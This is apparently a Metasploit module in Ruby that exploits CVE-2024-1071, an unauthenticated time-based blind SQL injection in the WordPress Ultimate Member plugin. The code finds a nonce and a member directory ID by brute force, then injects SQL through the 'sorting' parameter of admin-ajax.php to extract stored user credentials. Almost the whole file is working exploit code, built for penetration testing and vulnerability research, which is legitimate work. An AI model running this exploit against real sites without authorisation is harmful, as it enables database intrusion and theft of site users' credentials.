##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi

  NONCE_REDIRECT_LIMIT = 3

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Ultimate Member SQL Injection (CVE-2024-1071)',
        'Description' => %q{
          The Ultimate Member plugin for WordPress up to version 2.8.2 is vulnerable to SQL injection via
          the 'sorting' parameter. This allows unauthenticated attackers to exploit blind SQL injections and
          extract sensitive information from the database.
        },
        'Author' => [
          'Christiaan Swiers',  # Vulnerability Discovery
          'Valentin Lobstein'   # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-1071'],
          ['URL', 'https://github.com/gbrsh/CVE-2024-1071'],
          ['URL', 'https://www.wordfence.com/blog/2024/02/2063-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-ultimate-member-wordpress-plugin/']
        ],
        'Actions' => [
          ['Extract User Credentials', { 'Description' => 'SQL Injection via sorting parameter' }]
        ],
        'DefaultAction' => 'Extract User Credentials',
        'DefaultOptions' => { 'SqliDelay' => 1, 'VERBOSE' => true },
        'DisclosureDate' => '2024-02-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options [
      OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
      OptInt.new('DIR_ID_MIN', [true, 'Minimum value for bruteforcing directory IDs', 1]),
      OptInt.new('DIR_ID_MAX', [true, 'Maximum value for bruteforcing directory IDs', 100]),
      OptInt.new('PAGE_ID_MIN', [true, 'Minimum page ID for bruteforcing registration pages', 1]),
      OptInt.new('PAGE_ID_MAX', [true, 'Maximum page ID for bruteforcing registration pages', 20])
    ]
  end

  def get_nonce
    if datastore['PAGE_ID_MIN'] > datastore['PAGE_ID_MAX']
      fail_with(Failure::BadConfig, 'PAGE_ID_MIN must not exceed PAGE_ID_MAX')
    end

    print_status('Attempting to locate the registration page and retrieve the nonce...')

    received_response = false

    (datastore['PAGE_ID_MIN']..datastore['PAGE_ID_MAX']).each do |page_id|
      res = nonce_page_response({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'vars_get' => { 'page_id' => page_id }
      })

      received_response ||= !res.nil?
      next unless res&.code && res.code <= 500

      page = res.get_html_document

      script_tag = page.at_xpath('//script[contains(text(), "um_scripts")]')
      next unless script_tag

      nonce = script_tag.text[/"nonce":"([^"]+)"/, 1]
      if nonce && !nonce.strip.empty?
        print_good("Nonce retrieved: #{nonce} using ?page_id=#{page_id}")
        return nonce
      end
    end

    unless received_response
      fail_with(Failure::Unreachable, 'Target did not respond while retrieving an Ultimate Member nonce')
    end

    fail_with(Failure::NotFound, 'Failed to retrieve an Ultimate Member nonce within the configured page range')
  end

  def get_directory_id(nonce)
    min_range = datastore['DIR_ID_MIN']
    max_range = datastore['DIR_ID_MAX']
    print_status("Searching for valid directory id between #{min_range} and #{max_range}...")

    (min_range..max_range).each do |num|
      id = Rex::Text.md5(num.to_s)[10..14]
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_post' => {
          'action' => 'um_get_members',
          'nonce' => nonce,
          'directory_id' => id
        }
      })

      next unless res

      json_body = res.get_json_document

      if json_body && json_body['success'] == true
        print_good("Valid directory ID found: #{id} (tested with #{num})")
        return id
      end
    end

    fail_with(Failure::NotFound, "Could not find a valid directory id within the range #{min_range} to #{max_range}")
  end

  def run
    # next line included for automatic inclusion into vulnerable plugins list
    # check_plugin_version_from_readme('ultimate-member', '2.8.3')
    print_status("Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...")

    nonce = get_nonce
    directory_id = get_directory_id(nonce)

    if nonce && directory_id
      @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
        random_negative_number = -rand(99)
        random_characters = Rex::Text.rand_text_alphanumeric(5)

        res = send_request_cgi({
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
          'vars_post' => {
            'action' => 'um_get_members',
            'nonce' => nonce,
            'directory_id' => directory_id,
            # Alphanumeric aliases can resemble numbers, exponents or SQL keywords.
            # https://mariadb.com/docs/server/reference/sql-structure/sql-language-structure/identifier-names
            'sorting' => "user_login AND (SELECT #{random_negative_number} FROM (SELECT(#{payload}))`#{random_characters}`)"
          }
        })
        fail_with(Failure::Unreachable, 'Connection failed') unless res
      end

      fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
      print_good('Target is vulnerable to SQLi!')

      wordpress_sqli_initialize(@sqli)
      wordpress_sqli_get_users_credentials(datastore['COUNT'])
    else
      fail_with(Failure::NotFound, 'Failed to retrieve nonce or directory_id')
    end
  end

  private

  def nonce_page_response(request)
    origin = http_redirect_origin_from_options(request)
    connection = http_redirect_connection_options(request)
    res = send_request_cgi(request)

    NONCE_REDIRECT_LIMIT.times do
      break unless res&.redirect? && res.redirection

      destination = http_redirect_target_origin(res.redirection, origin)
      allowed_hosts = [origin[:host], rhost.to_s.downcase]
      allowed_ports = [origin[:port], ssl ? 443 : 80]
      unless !destination[:credentials] && destination[:scheme] == origin[:scheme] && allowed_hosts.include?(destination[:host]) && allowed_ports.include?(destination[:port])
        vprint_status('Not following the nonce page redirect outside the configured target')
        return res
      end

      # WordPress can canonicalize a virtual host to its public/default port.
      # Reuse the redirect normalizer while retaining the operator's endpoint.
      reconfig_redirect_opts!(res, request, preserve_connection: true, connection_options: connection)
      res = send_request_cgi(request)
    end

    res
  rescue Rex::ConnectionError => e
    elog('Failed to retrieve an Ultimate Member nonce page', error: e)
    nil
  rescue URI::Error => e
    elog('Invalid Ultimate Member nonce page redirect', error: e)
    res
  end
end
